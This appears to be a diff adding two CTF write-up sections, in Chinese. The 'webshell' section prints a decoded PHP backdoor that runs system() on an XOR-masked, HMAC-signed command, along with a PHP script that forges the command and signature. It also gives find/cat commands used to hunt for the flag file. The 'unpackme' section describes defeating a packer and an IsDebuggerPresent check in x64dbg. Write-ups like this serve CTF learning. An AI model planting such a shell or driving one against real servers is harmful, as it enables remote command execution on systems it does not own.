@@ -402,6 +402,63 @@ $url='https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&dir[]=1&comma
 echo $url;
 ?>
 ```
+## 36 webshell
+一開始看到的 php 被編碼起來了，把 code 放到自己的環境還原一下可以看到下面的 code
+```php=
+<?php
+function run()
+{ 
+	if(isset($_GET['cmd']) && isset($_GET['sig'])) 
+	{
+		$cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd']; 
+		$key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
+	 	$sig = hash_hmac('SHA512', $cmd, $key);
+	  	if($sig === (string)$_GET['sig'])
+	  	{
+	  		header('Content-Type: text/plain');
+	   		return !!system($cmd);
+	   	} 
+	}
+	return false; 
+} 
+function fuck()
+{
+	print(str_repeat("\n", 4096)); 
+	readfile($_SERVER['SCRIPT_FILENAME']); 
+} 
+run() ?: fuck();
+?>
+```
+裡面可以看到說，要用 get 輸入 cmd 還有 sig 欄位，然後 sig 就是用一些欄位算出來的，這些資訊都可以取得，就適當的替代一下就可以了，比較麻煩的是 cmd 的部分， server 端是將 xor 後的 command 再拿去執行的，所以一開始輸入的 command 應該是要先被 xor 好的，如此一來，再 xor 過一次後就會還原回你真正想輸入的指令。
+可透過下列命令取得對應的 cmd 跟 sig
+```php=
+<?php
+$remote_addr = '<your_ip>';
+$host = 'webshell.hackme.quest';
+$input_cmd = hash('SHA512', $remote_addr) ^ '<command>'; 
+
+echo 'cmd:';
+for($i = 0; $i < strlen($input_cmd); $i++){
+	$num = ord($input_cmd[$i]);
+	if($num < 16)
+		echo '%0'.dechex($num);
+	else
+		echo '%'.dechex($num);
+}
+echo '<br>';
+$cmd = $input_cmd;
+$cmd = hash('SHA512', $remote_addr) ^ (string)$cmd;
+$key = $_SERVER['HTTP_USER_AGENT'] . sha1($host);
+$sig = hash_hmac('SHA512', $cmd, $key);
+echo 'sig:'.$sig.'<br>';
+
+?>
+```
+
+接下來就是慢慢找 flag 了
+
+可以先用 ' find / -name "\*flag\*" '，來找出系統中名稱帶有 flag 的檔案然後再用'cat /var/www/html/.htflag' 看到真正的 flag
+
 
 
 # Reversing
@@ -711,6 +768,16 @@ int main()
 ```
 
 算出key後，再使用gdb執行程式，在0x804882b修改值來跳過檢查條件，再於後面將eax修改為key便可以得出flag了
+
+## 51 unpackme
+程式看起來是有被加過殼，用 ida 看不出甚麼東西，就直接用 x64dbg 來動態分析，然後因為程式有用 VirtualProtect 來修改程式，因此可以在這個 function 下斷點來快速跳到程式真正在執行的地方。
+進到程式後有幾個地方需要注意
+1. 有個 IsDebuggerPresent function 要把他的 return value 改為 0
+2. Check Password 是被 disable 掉的，要修改 esp 中的值使其在呼叫 EnableWindow 時會把 button ebable
+
+接著就直接按 F9 讓程式執行，然後隨便輸入 password 後跳出 messagebox 說 wrong answer，所以接著可以對 messagebox 的相關 function 下斷點來找到進行判斷的程式
+
+找到程式並解析後發現他是對輸入做 md5 雜湊後與記憶體中的值做比較，該指定的值為 34AF0D074B17F44D1BB939765B02776F，對其做 md5 解碼後輸入就可以得出 flag 了
 
 # Pwn
 ## 57 catflag
